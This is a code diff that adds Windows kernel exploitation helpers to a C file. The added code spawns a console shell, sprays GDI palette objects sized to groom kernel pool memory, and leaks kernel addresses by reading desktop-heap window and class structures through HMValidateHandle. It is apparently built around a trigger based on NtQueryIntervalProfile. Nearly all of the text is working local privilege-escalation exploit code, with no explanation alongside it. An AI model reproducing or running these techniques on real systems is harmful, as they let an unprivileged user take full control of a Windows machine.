@@ -5,6 +5,27 @@ VOID ShowError(char *str, DWORD dwErrorCode)
 	printf("%s Error 0x%X\n", str, dwErrorCode);
 }
 
+BOOL CreateCmd()
+{
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+
+	BOOL bRet = CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
+	if (bRet)
+	{
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+	}
+	else ShowError("CreateProcess", GetLastError());
+	
+	return bRet;
+}
+
+
 BOOL CreateClipboard(DWORD dwSize)
 {
 	BOOL bRet = TRUE;
@@ -196,4 +217,104 @@ BOOL CallNtQueryIntervalProfile()
 
 exit:
 	return bRet;
+}
+
+HPALETTE CreatePaletteBySize(DWORD dwSize)
+{
+	HPALETTE hPalette = NULL;
+	PLOGPALETTE pLogPalette = NULL;
+
+	DWORD dwNumEntries = (dwSize - 0x90) / 4;
+	DWORD dwPalSize = sizeof(LOGPALETTE) + (dwNumEntries - 1) * sizeof(PALETTEENTRY);
+
+	pLogPalette = (PLOGPALETTE)malloc(dwPalSize);
+	if (!pLogPalette)
+	{
+		ShowError("malloc", GetLastError());
+		goto exit;
+	}
+
+	ZeroMemory(pLogPalette, dwPalSize);
+	memset(pLogPalette, 0x41, dwPalSize);
+	pLogPalette->palNumEntries = dwNumEntries;
+	pLogPalette->palVersion = 0x300;
+
+	hPalette = CreatePalette(pLogPalette);
+	if (!hPalette)
+	{
+		ShowError("CreatePalette", GetLastError());
+		goto exit;
+	}
+
+exit:
+	return hPalette;
+}
+
+ULONG64 AllocateFreeWindow(DWORD dwMNSize)
+{
+	ULONG64 ulRes = 0;
+	HINSTANCE handle = NULL;
+
+	handle = GetModuleHandle(NULL);
+	if (!handle)
+	{
+		ShowError("GetModuleHandle", GetLastError());
+		goto exit;
+	}
+
+	WNDCLASSW wc = { 0 };
+	WCHAR szMenuName[0x1005] = { 0 };
+	PWCHAR pClassName = L"LEAKWS";
+
+	memset(szMenuName, 0x41, dwMNSize);
+	wc.style = CS_HREDRAW | CS_VREDRAW;
+	wc.hInstance = handle;
+	wc.lpfnWndProc = DefWindowProc;
+	wc.lpszClassName = pClassName;
+	wc.lpszMenuName = szMenuName;
+
+	if (!RegisterClassW(&wc))
+	{
+		ShowError("RegisterClassW", GetLastError());
+		goto exit;
+	}
+
+	HWND hWnd = CreateWindowExW(0, pClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (!hWnd)
+	{
+		ShowError("CreateWindowExW", GetLastError());
+		goto exit;
+	}
+
+	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
+	if (!HMValidateHandle) goto exit;
+
+	PTHRDESKHEAD pTagWndHead = (PTHRDESKHEAD)HMValidateHandle(hWnd, TYPE_WINDOW);
+	ULONG64 ulTagCls = 0, ulClientDelta = 0;
+
+	ulClientDelta = (ULONG64)pTagWndHead->pSelf - (ULONG64)pTagWndHead;
+	ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
+	ulRes = *(PULONG64)(ulTagCls + 0x98);
+
+	DestroyWindow(hWnd);
+	UnregisterClassW(pClassName, handle);
+
+exit:
+	return ulRes;
+}
+
+ULONG64 AllocateFreeWindows(DWORD dwSize)
+{
+	ULONG64 ulPreEntry = 0, ulCurEntry = 0;
+
+	ulPreEntry = AllocateFreeWindow(dwSize);
+	ulCurEntry = AllocateFreeWindow(dwSize);
+
+	while (ulCurEntry != ulPreEntry)
+	{
+		ulPreEntry = ulCurEntry;
+		ulCurEntry = AllocateFreeWindow(dwSize);
+	} 
+
+	return ulCurEntry;
 }
